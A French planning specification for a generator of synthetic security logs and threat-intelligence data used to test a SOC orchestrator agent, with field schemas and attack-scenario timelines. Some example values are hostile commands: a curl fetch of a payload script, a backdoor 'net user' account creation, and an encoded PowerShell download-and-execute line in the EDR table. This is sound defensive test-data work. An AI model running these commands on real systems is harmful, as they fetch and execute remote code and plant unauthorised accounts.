# DzolaCyber - Module Dummy Data Planning
> Planification des données d'entrée simulées pour l'Agent Orchestrateur

## 1. Vue d'ensemble

### 1.1 Objectif
Générer des données fictives réalistes qui alimenteront l'Agent Orchestrateur DzolaCyber dans un environnement de développement/test.

### 1.2 Architecture des flux de données (aperçu)
```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  SOURCES        │────▶│  MODULE DUMMY   │────▶│  MODULE DE     │
│  (Internes/     │     │  (Générateur    │     │   PREPROCESSING │
│   Externes)     │     │   de données)   │     │  Aggrégation    │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

### 1.3 Principes directeurs
- **Cohérence temporelle** : Les données doivent respecter une timeline réaliste (alertes → investigations → incidents)
- **Variabilité contrôlée** : Paramètres configurables pour stress-test ou scénarios spécifiques
- **Conformité NIST** : Structure alignée sur les phases Identify/Protect/Detect/Respond/Recover

---

## 2. Sources Internes (Données SI interne)

### 2.1 Wazuh (EDR/SIEM)
#### Type de données : Logs de sécurité, alertes temps réel

**Schéma de données à générer :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `timestamp` | ISO8601 | Date/heure de l'alerte | `2024-01-15T14:32:18Z` |
| `agent.id` | string | ID agent Wazuh | `001`, `002` |
| `agent.name` | string | Nom du endpoint | `srv-web-prod-01`, `wk-station-hr-05` |
| `agent.ip` | IPv4 | Adresse IP source | `192.168.10.15` |
| `rule.id` | string | ID règle déclenchée | `5710`, `100002` |
| `rule.level` | int (0-15) | Niveau criticité | `7`, `12`, `15` |
| `rule.description` | string | Description alerte | `"Multiple failed login attempts"` |
| `rule.groups` | array | Catégories MITRE ATT&CK | `["authentication", "attack_attempt"]` |
| `rule.mitre.id` | array | IDs techniques MITRE | `["T1110", "T1078"]` |
| `decoder.name` | string | Type de log | `sshd`, `windows_eventchannel` |
| `data.srcip` | IPv4 | IP source attaquant | `45.142.212.100` |
| `data.dstip` | IPv4 | IP destination | `192.168.10.15` |
| `data.user` | string | Utilisateur concerné | `admin`, `john.doe` |
| `data.command` | string | Commande détectée | `curl http://malicious.com/payload.sh` |
| `location` | string | Chemin fichier log | `/var/log/auth.log` |
| `full_log` | string | Log brut complet | `"Jan 15 14:32:17 srv-web sshd[1234]: Failed password for admin from 45.142.212.100 port 54321 ssh2"` |

**Scénarios de données à couvrir :**
- [ ] Brute force SSH (échecs multiples → succès)
- [ ] Privilege escalation (sudo/su anormal)
- [ ] Malware detection (YARA rules)
- [ ] Web shell upload
- [ ] Lateral movement (psexec, wmic)
- [ ] Data exfiltration (volume anormal)

**Volume cible :** 100-5000 alertes/jour simulées

---

### 2.2 Suricata (IDS/IPS)
#### Type de données : Alertes réseau, trafic malveillant

**Schéma de données à générer :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `timestamp` | ISO8601 | Date/heure | `2024-01-15T14:32:18.123456Z` |
| `event_type` | string | Type d'événement | `alert`, `http`, `dns`, `tls`, `fileinfo` |
| `src_ip` | IPv4/IPv6 | Source | `192.168.10.15` |
| `src_port` | int | Port source | `54321` |
| `dest_ip` | IPv4/IPv6 | Destination | `45.142.212.100` |
| `dest_port` | int | Port destination | `443`, `8080` |
| `proto` | string | Protocole | `TCP`, `UDP`, `ICMP` |
| `alert.action` | string | Action prise | `allowed`, `blocked` |
| `alert.gid` | int | Groupe ID | `1` |
| `alert.signature_id` | int | ID signature | `2013026` |
| `alert.rev` | int | Révision | `5` |
| `alert.signature` | string | Nom règle | `"ET MALWARE Possible C2 SSL Cert"` |
| `alert.category` | string | Catégorie | `"Malware Command and Control Activity"` |
| `alert.severity` | int (1-4) | Sévérité | `1` (critique) |
| `http.hostname` | string | Host HTTP | `evil-c2.com` |
| `http.url` | string | URL requêtée | `/api/v1/checkin` |
| `http.http_method` | string | Méthode | `POST`, `GET` |
| `http.user_agent` | string | User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` |
| `dns.rrname` | string | Requête DNS | `suspicious-domain.xyz` |
| `tls.sni` | string | Server Name Indication | `cdn-malicious.net` |
| `flow_id` | string | ID de flux unique | `1234567890123456` |

**Scénarios réseau à couvrir :**
- [ ] C2 beaconing (intervalles réguliers)
- [ ] DNS tunneling (longues requêtes DNS)
- [ ] Exfiltration HTTP/HTTPS (POST data volumineux)
- [ ] Scan de ports (SYN flood)
- [ ] Téléchargement de payload (EXE, DLL, SCR)
- [ ] Communication avec IPs malveillantes (TI feeds)

**Volume cible :** 1000-10000 events/heure

---

### 2.3 FortiGate / Pare-feu
#### Type de données : Logs trafic, VPN, webfilter

**Schéma de données à générer :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `date` | string | Date | `2024-01-15` |
| `time` | string | Heure | `14:32:18` |
| `devname` | string | Nom appliance | `FGT-PRD-01` |
| `devid` | string | ID device | `FGVMEV0000000000` |
| `logid` | string | ID log | `0000000020` |
| `type` | string | Type | `traffic`, `utm`, `event`, `vpn` |
| `subtype` | string | Sous-type | `forward`, `local`, `sslvpn` |
| `level` | string | Niveau | `notice`, `warning`, `critical` |
| `vd` | string | VDOM | `root` |
| `srcip` | IPv4 | Source interne | `10.0.1.15` |
| `srcport` | int | Port source | `49234` |
| `srcintf` | string | Interface source | `port1` |
| `dstip` | IPv4 | Destination | `185.220.101.42` |
| `dstport` | int | Port destination | `443` |
| `dstintf` | string | Interface dest | `port2` |
| `sessionid` | int | ID session | `12345678` |
| `proto` | int | Protocole IP | `6` (TCP), `17` (UDP) |
| `action` | string | Action | `accept`, `deny`, `close` |
| `policyid` | int | ID politique FW | `42` |
| `policytype` | string | Type politique | `policy` |
| `service` | string | Service | `HTTPS`, `HTTP`, `DNS` |
| `hostname` | string | Hostname web | `pastebin.com` |
| `url` | string | URL complète | `https://pastebin.com/raw/abc123` |
| `webfilter` | string | Catégorie filtrage | `Malicious Websites` |
| `appcat` | string | Catégorie application | `Proxy` |
| `app` | string | Application ID | `Dropbox`, `Tor` |
| `vpn` | string | Type VPN | `ssl-tunnel` |
| `vpntunnel` | string | Nom tunnel | `SSL-VPN-tunnel` |
| `user` | string | Utilisateur auth | `john.doe@company.com` |
| `group` | string | Groupe | `VPN-Users` |
| `sentbyte` | int | Octets envoyés | `15234` |
| `rcvdbyte` | int | Octets reçus | `8901234` |
| `duration` | int | Durée secondes | `3600` |

**Scénarios pare-feu à couvrir :**
- [ ] Blocage catégorie URL malveillante
- [ ] Téléchargement de fichier bloqué (AV)
- [ ] Connexion VPN anormale (heure/geo)
- [ ] Volume de données anormal (exfiltration)
- [ ] Application non autorisée (shadow IT)
- [ ] Scan depuis l'extérieur bloqué

---

### 2.4 Active Directory / Windows Events
#### Type de données : Événements authentification, changements GPO

**Schéma de données à générer :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `EventID` | int | ID événement Windows | `4624`, `4625`, `4648`, `4720`, `4732` |
| `TimeCreated` | ISO8601 | Date/heure | `2024-01-15T14:32:18.1234567Z` |
| `Computer` | string | Contrôleur domaine | `DC01.corp.local` |
| `SubjectUserSid` | string | SID sujet | `S-1-5-18` |
| `SubjectUserName` | string | Nom sujet | `SYSTEM`, `john.doe` |
| `SubjectDomainName` | string | Domaine sujet | `CORP` |
| `TargetUserSid` | string | SID cible | `S-1-5-21-...-500` |
| `TargetUserName` | string | Nom cible | `administrator`, `svc_backup` |
| `TargetDomainName` | string | Domaine cible | `CORP` |
| `LogonType` | int | Type connexion | `2` (interactive), `3` (network), `10` (remote) |
| `IpAddress` | IPv4 | IP source | `192.168.10.15` |
| `IpPort` | int | Port source | `0`, `445` |
| `AuthenticationPackageName` | string | Package auth | `NTLM`, `Kerberos` |
| `LmPackageName` | string | Package LM | `NTLM V2` |
| `KeyLength` | int | Longueur clé | `128` |
| `ProcessName` | string | Processus | `C:\Windows\System32\svchost.exe` |
| `CommandLine` | string | Ligne commande | `net user hacker P@ssw0rd /add` |
| `ObjectClass` | string | Classe objet | `user`, `group` |
| `ObjectDN` | string | DN objet | `CN=John Doe,OU=Users,DC=corp,DC=local` |
| `GroupName` | string | Nom groupe | `Domain Admins` |
| `MemberName` | string | Membre ajouté | `CN=Hacker,CN=Users,DC=corp,DC=local` |

**Scénarios AD à couvrir :**
- [ ] Échec connexion multiples (brute force)
- [ ] Connexion depuis IP inhabituelle
- [ ] Création compte utilisateur suspect
- [ ] Ajout au groupe Domain Admins
- [ ] Kerberoasting (TGS_REQ service account)
- [ ] Pass-the-hash (NTLM anormal)
- [ ] Modification GPO (persistence)

---

### 2.5 Endpoints (EDR - CrowdStrike/SentinelOne)
#### Type de données : Processus, connexions, fichiers

**Schéma de données à générer :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `event_time` | ISO8601 | Timestamp | `2024-01-15T14:32:18Z` |
| `event_type` | string | Type événement | `ProcessRollup`, `NetworkConnect`, `FileWrite` |
| `aid` | string | Agent ID | `1234567890abcdef` |
| `hostname` | string | Nom machine | `WK-HR-05.corp.local` |
| `username` | string | Utilisateur | `CORP\john.doe` |
| `process_id` | int | PID | `1234` |
| `process_name` | string | Nom processus | `powershell.exe`, `cmd.exe` |
| `process_path` | string | Chemin complet | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| `process_cmdline` | string | Ligne commande | `powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBwAHMAMQAnACkA` |
| `parent_process_name` | string | Process parent | `explorer.exe`, `winword.exe` |
| `parent_process_id` | int | PID parent | `4567` |
| `remote_address` | IPv4 | IP distante | `192.168.1.100` |
| `remote_port` | int | Port distant | `4444`, `8080` |
| `local_address` | IPv4 | IP locale | `192.168.10.15` |
| `local_port` | int | Port local | `49234` |
| `protocol` | string | Protocole | `tcp`, `udp` |
| `file_name` | string | Nom fichier | `invoice.pdf.exe` |
| `file_path` | string | Chemin fichier | `C:\Users\john.doe\Downloads\invoice.pdf.exe` |
| `file_hash_md5` | string | Hash MD5 | `d41d8cd98f00b204e9800998ecf8427e` |
| `file_hash_sha256` | string | Hash SHA256 | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| `signature_status` | string | Statut signature | `NotSigned`, `Invalid`, `Valid` |
| `detection_name` | string | Nom détection | `Malware:Win32/Trojan.Gen!BT` |
| `severity` | string | Sévérité | `High`, `Critical` |
| `tactic` | string | Tactique MITRE | `Execution`, `Persistence` |
| `technique` | string | Technique MITRE | `PowerShell`, `Regsvr32` |

**Scénarios EDR à couvrir :**
- [ ] PowerShell obfusqué/encodé
- [ ] Process hollowing/injection
- [ ] LOLBAS (Living Off The Land)
- [ ] Ransomware behavior (file encryption pattern)
- [ ] Persistence registry (Run keys)
- [ ] AMSI bypass attempt

---

## 3. Sources Externes (Threat Intelligence)

### 3.1 MISP (Malware Information Sharing Platform)
#### Type de données : IOCs, attributs, événements

**Schéma de données à générer :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `Event.id` | int | ID événement | `12345` |
| `Event.uuid` | UUID | UUID unique | `5f3d2c1e-1234-5678-9abc-0123456789ab` |
| `Event.info` | string | Titre événement | `"TrickBot C2 Infrastructure 2024-01"` |
| `Event.threat_level_id` | int (1-4) | Niveau menace | `1` (High), `2` (Medium), `3` (Low), `4` (Undefined) |
| `Event.analysis` | int (0-2) | Statut analyse | `0` (Initial), `1` (Ongoing), `2` (Complete) |
| `Event.date` | date | Date création | `2024-01-15` |
| `Event.timestamp` | int | Timestamp Unix | `1705329138` |
| `Event.publish_timestamp` | int | Timestamp publication | `1705329200` |
| `Event.published` | bool | Publié | `true` |
| `Event.Org.name` | string | Organisation source | `CIRCL`, `AlienVault` |
| `Event.Orgc.name` | string | Créateur | `ThreatIntelTeam` |
| `Event.Tag` | array | Tags | `[{"name": "tlp:amber"}, {"name": "malware:trickbot"}]` |
| `Attribute.id` | int | ID attribut | `67890` |
| `Attribute.type` | string | Type IOC | `ip-dst`, `domain`, `md5`, `sha256`, `url`, `email-src` |
| `Attribute.category` | string | Catégorie | `Network activity`, `Payload delivery`, `Artifacts dropped` |
| `Attribute.value` | string | Valeur IOC | `185.220.101.42`, `evil-c2.com` |
| `Attribute.comment` | string | Commentaire | `"TrickBot C2 server"` |
| `Attribute.to_ids` | bool | Détectable IDS | `true` |
| `Attribute.timestamp` | int | Timestamp ajout | `1705329138` |
| `Attribute.first_seen` | string | Première vue | `2024-01-10T00:00:00.000000+00:00` |
| `Attribute.last_seen` | string | Dernière vue | `2024-01-15T23:59:59.000000+00:00` |
| `GalaxyCluster` | array | Clusters galaxy | MITRE ATT&CK, Malware, Threat Actor |

**Types d'IOC à générer :**
- [ ] IPv4 malveillantes (C2, scanners)
- [ ] Domaines (DGA, typosquatting)
- [ ] URLs (phishing, malware hosting)
- [ ] Hashes (MD5, SHA1, SHA256)
- [ ] Emails (phishing, spam)
- [ ] Mutex (malware families)
- [ ] YARA rules signatures

**Scénarios MISP à couvrir :**
- [ ] Campagne APT récente (nation-state)
- [ ] Ransomware-as-a-Service (RaaS)
- [ ] Phishing ciblé (spear-phishing)
- [ ] Vulnérabilité 0-day exploitée
- [ ] Botnet infrastructure

---

### 3.2 IRIS (DFIR-IRIS)
#### Type de données : Cas d'investigation, IOCs, evidences

**Schéma de données à générer :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `case_id` | int | ID cas | `42` |
| `case_uuid` | UUID | UUID cas | `case-uuid-1234-5678` |
| `case_name` | string | Nom du cas | `"Incident Ransomware Jan 2024"` |
| `case_description` | string | Description | `"Infection par ransomware LockBit sur le serveur FILESRV01"` |
| `case_open_date` | datetime | Date ouverture | `2024-01-15T08:00:00Z` |
| `case_close_date` | datetime | Date fermeture | `null` (ou date si clos) |
| `case_status_id` | int | Statut | `1` (Open), `2` (In Progress), `3` (Closed) |
| `case_severity_id` | int | Sévérité | `1` (Low), `2` (Medium), `3` (High), `4` (Critical) |
| `case_owner_id` | int | ID analyste | `5` |
| `case_customer_id` | int | ID client | `1` |
| `case_classification_id` | int | Classification | `1` (Malware), `2` (Phishing), etc. |
| `ioc_id` | int | ID IOC | `123` |
| `ioc_value` | string | Valeur IOC | `lockbit.exe`, `192.168.1.100` |
| `ioc_type_id` | int | Type IOC | `1` (IP), `2` (Domain), `3` (File Hash) |
| `ioc_description` | string | Description IOC | `"Fichier ransomware détecté"` |
| `ioc_tags` | string | Tags | `ransomware,lockbit,executable` |
| `evidence_id` | int | ID evidence | `456` |
| `evidence_uuid` | UUID | UUID evidence | `ev-uuid-1234` |
| `evidence_type` | string | Type | `disk`, `memory`, `network`, `file` |
| `evidence_filename` | string | Nom fichier | `memory-dump-srv01.raw` |
| `evidence_hash` | string | Hash SHA256 | `abc123...` |
| `evidence_size` | int | Taille bytes | `8589934592` |
| `evidence_description` | string | Description | `"Dump mémoire du serveur infecté"` |
| `task_id` | int | ID tâche | `789` |
| `task_title` | string | Titre tâche | `"Analyser le dump mémoire"` |
| `task_status` | string | Statut | `pending`, `in_progress`, `completed` |
| `task_assignee_id` | int | ID assigné | `3` |
| `note_id` | int | ID note | `100` |
| `note_title` | string | Titre note | `"Analyse préliminaire"` |
| `note_content` | string | Contenu | `"Présence de processus chiffrant les fichiers..."` |

**Scénarios IRIS à couvrir :**
- [ ] Incident ransomware (LockBit, BlackCat)
- [ ] Compromission email business (BEC)
- [ ] Fuite de données (data breach)
- [ ] Insider threat
- [ ] Supply chain attack

---

### 3.3 UKWELI (Liens/Fichiers suspects)
#### Type de données : URLs analysées, fichiers sandboxés

**Schéma de données à générer :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `submission_id` | string | ID soumission | `sub_123456789` |
| `submission_date` | ISO8601 | Date soumission | `2024-01-15T14:32:18Z` |
| `submitter` | string | Soumetteur | `wazuh-agent`, `manual-upload` |
| `url` | string | URL analysée | `http://suspicious-site.com/download.exe` |
| `file_name` | string | Nom fichier | `invoice.pdf.exe` |
| `file_type` | string | Type MIME | `application/x-dosexec` |
| `file_size` | int | Taille bytes | `245760` |
| `sha256` | string | Hash SHA256 | `e3b0c44298fc1c149afbf4c8996fb924...` |
| `md5` | string | Hash MD5 | `d41d8cd98f00b204e9800998ecf8427e` |
| `analysis_status` | string | Statut analyse | `queued`, `analyzing`, `completed`, `failed` |
| `analysis_date` | ISO8601 | Date analyse | `2024-01-15T14:35:22Z` |
| `detection_score` | int (0-100) | Score détection | `85` |
| `verdict` | string | Verdict | `malicious`, `suspicious`, `clean` |
| `malware_family` | string | Famille malware | `TrickBot`, `Emotet`, `QakBot` |
| `malware_type` | string | Type | `trojan`, `ransomware`, `spyware` |
| `behavior_summary` | array | Comportements | `["file-encryption", "registry-modification", "network-communication"]` |
| `network_indicators` | array | IOCs réseau | `[{"ip": "185.220.101.42", "port": 443, "protocol": "https"}]` |
| `file_indicators` | array | IOCs fichiers | `[{"path": "C:\\Windows\\Temp\\evil.dll", "operation": "created"}]` |
| `registry_indicators` | array | IOCs registry | `[{"key": "HKLM\\...\\Run", "value": "evil.exe"}]` |
| `screenshots` | array | URLs screenshots | `["https://sandbox/12345/screen1.png"]` |
| `report_url` | string | URL rapport complet | `https://sandbox/report/12345` |

---

### 3.4 Feeds Threat Intelligence (Open Source)
#### Type de données : Listes noires, rapports

**Sources à simuler :**

| Source | Type de données | Fréquence | Format |
|--------|----------------|-----------|--------|
| Abuse.ch (URLhaus) | URLs malveillantes | Temps réel | JSON/CSV |
| Abuse.ch (MalwareBazaar) | Hashes malware | Quotidien | JSON/API |
| AlienVault OTX | IOCs communautaires | Temps réel | JSON/API |
| VirusTotal | Rapports analyse | On-demand | JSON/API |
| CIRCL MISP Feed | Événements MISP | Temps réel | MISP JSON |
| CERT-FR | Alertes sécurité | Hebdomadaire | RSS/HTML |
| CISA KEV | Vulnérabilités exploitées | Quotidien | JSON |
| MITRE ATT&CK | TTPs | Mensuel | STIX 2.1 |

**Structure générique pour feeds :**

| Champ | Type | Description |
|-------|------|-------------|
| `feed_name` | string | Nom du feed |
| `feed_url` | string | URL source |
| `fetch_timestamp` | ISO8601 | Date récupération |
| `ioc_type` | string | Type d'IOC |
| `ioc_value` | string | Valeur |
| `threat_type` | string | Type de menace |
| `confidence` | int (0-100) | Confiance |
| `first_seen` | ISO8601 | Première apparition |
| `last_seen` | ISO8601 | Dernière apparition |
| `expiration_date` | ISO8601 | Date expiration |

---

## 4. Corrélation & Enrichissement

### 4.1 Données de contexte interne

**Inventaire d'actifs (CMDB) :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `asset_id` | string | ID unique | `ASSET-001` |
| `hostname` | string | Nom machine | `srv-web-prod-01` |
| `ip_address` | IPv4 | IP principale | `192.168.10.10` |
| `mac_address` | string | Adresse MAC | `00:50:56:c0:00:08` |
| `os_type` | string | Type OS | `Windows Server 2022`, `Ubuntu 22.04` |
| `os_version` | string | Version OS | `10.0.20348` |
| `asset_type` | string | Type | `server`, `workstation`, `network`, `mobile` |
| `criticality` | string | Criticité | `critical`, `high`, `medium`, `low` |
| `department` | string | Département | `IT`, `HR`, `Finance`, `Production` |
| `owner` | string | Responsable | `john.doe@company.com` |
| `location` | string | Site géographique | `Paris-DC`, `Lyon-Office` |
| `vlan` | string | VLAN | `VLAN-10-Servers` |
| `services` | array | Services exposés | `["HTTP", "HTTPS", "SSH"]` |
| `installed_software` | array | Logiciels | `["Apache 2.4", "MySQL 8.0"]` |
| `patch_level` | string | Niveau patching | `2024-01`, `critical-missing` |
| `edr_agent` | string | Agent EDR | `CrowdStrike`, `SentinelOne` |
| `last_seen` | ISO8601 | Dernière connue | `2024-01-15T14:30:00Z` |

**Utilisateurs (Identity) :**

| Champ | Type | Description | Exemple |
|-------|------|-------------|---------|
| `user_id` | string | ID unique | `USR-001` |
| `username` | string | Login | `john.doe` |
| `email` | string | Email | `john.doe@company.com` |
| `full_name` | string | Nom complet | `John Doe` |
| `department` | string | Département | `IT Security` |
| `job_title` | string | Fonction | `Security Analyst` |
| `manager` | string | Manager | `jane.smith@company.com` |
| `groups` | array | Groupes AD | `["IT-Security", "VPN-Users"]` |
| `privileged` | bool | Compte privilégié | `true`, `false` |
| `mfa_enabled` | bool | MFA activé | `true` |
| `last_login` | ISO8601 | Dernière connexion | `2024-01-15T09:00:00Z` |
| `login_history` | array | Historique IPs | `[{"ip": "192.168.1.10", "date": "2024-01-15"}]` |
| `risk_score` | int (0-100) | Score risque | `25` |

---

## 5. Scénarios de données complètes

### 5.1 Scénario A : Attaque par ransomware (LockBit)

**Timeline des événements à générer :**

| Time | Source | Événement | Détails |
|------|--------|-----------|---------|
| T+0 | Suricata | C2 beaconing | Connexion vers `185.220.101.42:443` |
| T+5min | Wazuh | Echec login SSH | Tentative brute force depuis `45.142.212.100` |
| T+10min | Wazuh | Succès login SSH | Connexion anormale `admin` depuis IP externe |
| T+15min | EDR | Process PowerShell | Exécution encodée `powershell -enc...` |
| T+20min | AD | Création compte | Nouveau compte `svc_backup` ajouté |
| T+25min | AD | Ajout groupe | `svc_backup` ajouté à `Domain Admins` |
| T+30min | EDR | Téléchargement | `lockbit.exe` téléchargé depuis `evil-c2.com` |
| T+35min | EDR | Exécution | `lockbit.exe` lancé avec privilèges SYSTEM |
| T+40min | Wazuh | File integrity | Modification massive fichiers `.lockbit` |
| T+45min | Suricata | Exfiltration | Upload 10GB vers `185.220.101.42:8080` |
| T+50min | FortiGate | Blocage | Connexion C2 bloquée par politique |
| T+55min | IRIS | Cas ouvert | Incident déclaré, investigation lancée |

**Données MISP associées :**
- IOCs LockBit connus (hashes, IPs, domains)
- TTPs MITRE ATT&CK (T1486 - Data Encrypted for Impact)

---

### 5.2 Scénario B : Phishing ciblé (BEC)

**Timeline :**

| Time | Source | Événement | Détails |
|------|--------|-----------|---------|
| T+0 | MISP | Nouveau IOC | Domaine `company-invoice.com` signalé |
| T+2h | FortiGate | Email reçu | Email de `ceo@company-invoice.com` |
| T+2h5m | Endpoint | Clic lien | Utilisateur ouvre `company-invoice.com/pay` |
| T+2h6m | Suricata | DNS query | Résolution `company-invoice.com` → `185.220.101.50` |
| T+2h7m | EDR | Téléchargement | `invoice.exe` (trojan) téléchargé |
| T+2h10m | EDR | Exécution | `invoice.exe` lancé, injection dans `explorer.exe` |
| T+2h15m | AD | Login anormal | Connexion depuis `185.220.101.50` (VPN?) |
| T+2h20m | Wazuh | Recherche emails | Script PowerShell scanne boîtes mail |
| T+2h30m | FortiGate | Exfiltration | Emails exportés vers `185.220.101.50:587` |

---

### 5.3 Scénario C : Insider Threat

**Timeline :**

| Time | Source | Événement | Détails |
|------|--------|-----------|---------|
| T+0 | DLP | Alert volume | Utilisateur `john.doe` télécharge 50 fichiers |
| T+5min | Wazuh | USB connecté | Device USB `Kingston 64GB` branché |
| T+10min | EDR | Copie fichiers | Copie `C:\Projects\Secret\*` vers `E:\Backup\` |
| T+15min | FortiGate | Upload cloud | Connexion `dropbox.com`, upload 2GB |
| T+20min | DLP | Email externe | Email à `personal@gmail.com` avec pièce jointe |
| T+25min | AD | Login après heures | Connexion 23:30 depuis IP interne |
| T+30min | Wazuh | Impression | Impression 200 pages `Classified-Project.pdf` |

---

## 6. Spécifications techniques du générateur

### 6.1 Configuration globale

```yaml
# config.yaml à implémenter
dummy:
  time_range:
    start: "2026-03-05T00:00:00Z"
    end: "2026-03-05T23:59:59Z"
    realtime_mode: false  # Si true, génère en temps réel
  
  volume:
    wazuh_alerts_per_day: 1000
    suricata_events_per_hour: 5000
    misp_iocs_total: 10000
    iris_cases: 50
  
  correlation:
    enable_timeline_consistency: true
    enable_cross_source_ioc_match: true
    enable_asset_user_mapping: true
  
  output:
    format: "json"  # json, jsonl, avro, parquet
    destination: "file"  # file, kafka, elasticsearch
    path: "data/output/"
  
  scenarios:
    - name: "ransomware_lockbit"
      probability: 0.3
    - name: "phishing_bec"
      probability: 0.4
    - name: "insider_threat"
      probability: 0.2
    - name: "apt_lateral_movement"
      probability: 0.1
```

### 6.2 Dépendances de données

```
Asset Inventory (CMDB)
    │
    ├──► Wazuh (agent.id → asset mapping)
    │
    ├──► EDR (hostname → asset mapping)
    │
    ├──► AD (user → asset login mapping)
    │
    └──► FortiGate (user → VPN mapping)

Threat Intelligence (MISP)
    │
    ├──► Suricata (IP/domain matching)
    │
    ├──► Wazuh (hash/IP matching)
    │
    └──► UKWELI (URL/file analysis correlation)

IRIS Cases
    │
    └──► Cross-reference avec tous les événements liés
```

### 6.3 Contraintes de cohérence

**À respecter impérativement :**

1. **Cohérence IP/MAC** : Une IP ne peut pas avoir deux MAC différentes
2. **Cohérence temporelle** : Un événement T+1 ne peut pas précéder T+0
3. **Cohérence utilisateur** : Un utilisateur ne peut pas être connecté sur deux postes simultanément (sauf cas spécifique)
4. **Cohérence MITRE** : Les techniques doivent correspondre aux tactiques
5. **Cohérence IOC** : Les IOCs MISP doivent apparaître dans les logs internes si `cross_source_match: true`

---

## 7. Structure du module dummy/

```
dummy/
├── config/
│   ├── scenarios.yaml          # Définition des scénarios
│   ├── volumes.yaml            # Paramètres de volume
│   └── sources.yaml            # Config sources internes/externes
├── data/
│   ├── templates/              # Templates JSON par source
│   │   ├── wazuh_template.json
│   │   ├── suricata_template.json
│   │   ├── misp_template.json
│   │   └── ...
│   └── dictionaries/           # Listes de valeurs réalistes
│       ├── hostnames.txt
│       ├── usernames.txt
│       ├── malware_families.txt
│       └── ...
├── generators/
│   ├── __init__.py
│   ├── base_generator.py       # Classe abstraite
│   ├── wazuh_generator.py
│   ├── suricata_generator.py
│   ├── misp_generator.py
│   ├── iris_generator.py
│   ├── ukweli_generator.py
│   ├── ad_generator.py
│   ├── fortigate_generator.py
│   ├── edr_generator.py
│   └── asset_generator.py      # CMDB & users
├── correlators/
│   ├── __init__.py
│   ├── timeline_correlator.py  # Cohérence temporelle
│   ├── ioc_correlator.py       # Matching IOCs
│   └── asset_correlator.py     # Mapping assets/events
├── scenarios/
│   ├── __init__.py
│   ├── base_scenario.py
│   ├── ransomware_scenario.py
│   ├── phishing_scenario.py
│   ├── insider_scenario.py
│   └── apt_scenario.py
├── exporters/
│   ├── __init__.py
│   ├── json_exporter.py
│   ├── kafka_exporter.py
│   └── elasticsearch_exporter.py
├── tests/
│   └── test_generators.py
└── main.py                     # Point d'entrée
```

---

## 8. Livrables attendus

### 8.1 Fichiers de données générés

| Fichier | Format | Description | Taille estimée |
|---------|--------|-------------|----------------|
| `wazuh_alerts.jsonl` | JSON Lines | Alertes Wazuh | ~50MB |
| `suricata_events.jsonl` | JSON Lines | Events Suricata | ~200MB |
| `misp_iocs.json` | JSON | IOCs MISP | ~10MB |
| `iris_cases.json` | JSON | Cas IRIS | ~5MB |
| `ukweli_analysis.jsonl` | JSON Lines | Analyses sandbox | ~20MB |
| `ad_events.jsonl` | JSON Lines | Events Windows | ~30MB |
| `fortigate_logs.jsonl` | JSON Lines | Logs firewall | ~100MB |
| `edr_events.jsonl` | JSON Lines | Events EDR | ~150MB |
| `assets_inventory.json` | JSON | Inventaire CMDB | ~2MB |
| `users_directory.json` | JSON | Annuaire utilisateurs | ~1MB |
| `correlated_timeline.json` | JSON | Timeline complète | ~20MB |

### 8.2 Métadonnées

- `metadata.json` : Statistiques de génération, checksums, mapping des scénarios
- `correlation_index.json` : Index des relations entre événements (pour debug)

---

## 9. Critères de validation

### 9.1 Qualité des données

- [ ] **Réalisme** : Les données doivent être indiscernables de données réelles pour un analyste
- [ ] **Cohérence** : Aucune contradiction temporelle ou logique
- [ ] **Couverture** : Tous les champs du schéma sont présents et variés
- [ ] **Performance** : Génération de 24h de données en < 5 minutes

### 9.2 Tests de validation

1. **Test de corrélation** : Vérifier que les IOCs MISP apparaissent dans les logs internes
2. **Test de timeline** : Vérifier l'ordre chronologique des événements d'un scénario
3. **Test de cohérence** : Vérifier qu'un asset n'a pas deux IP simultanément
4. **Test de format** : Valider contre les schémas JSON Schema officiels (Wazuh, Suricata, MISP)

---

## 10. Roadmap d'implémentation

### Phase 1 : Fondations
- [ ] Créer structure projet et classes de base
- [ ] Implémenter générateurs de données aléatoires réalistes (IPs, timestamps, noms)
- [ ] Créer templates JSON pour chaque source
- [ ] Générer données non corrélées (sources indépendantes)

### Phase 2 : Corrélation
- [ ] Implémenter système de timeline cohérente
- [ ] Créer mapping assets ↔ events
- [ ] Implémenter matching IOCs internes/externes
- [ ] Générer scénario simple (1 scénario, timeline linéaire)

### Phase 3 : Scénarios complexes
- [ ] Implémenter scénario ransomware complet
- [ ] Implémenter scénario phishing
- [ ] Implémenter scénario insider threat
- [ ] Ajouter bruit de fond réaliste (events non liés)

### Phase 4 : Export & Intégration
- [ ] Implémenter exporters (JSON, Kafka, ES)
- [ ] Créer configuration YAML complète
- [ ] Ajouter tests automatisés
- [ ] Documentation et exemples d'utilisation

---

## 11. Annexes

### 11.1 Références schémas officiels

- Wazuh : https://documentation.wazuh.com/current/user-manual/api/reference.html
- Suricata : https://suricata.readthedocs.io/en/latest/output/eve/eve-json-format.html
- MISP : https://www.misp-project.org/openapi/
- MITRE ATT&CK : https://attack.mitre.org/
- Windows Events : https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing

### 11.2 Outils de référence

- **MITRE Caldera** : Pour les TTPs réalistes
- **Atomic Red Team** : Pour les commandes et techniques
- **Mordor** : Datasets réels de cyber attaques (référence)
- **EVTX-ATTACK-SAMPLES** : Exemples réels d'events Windows

---

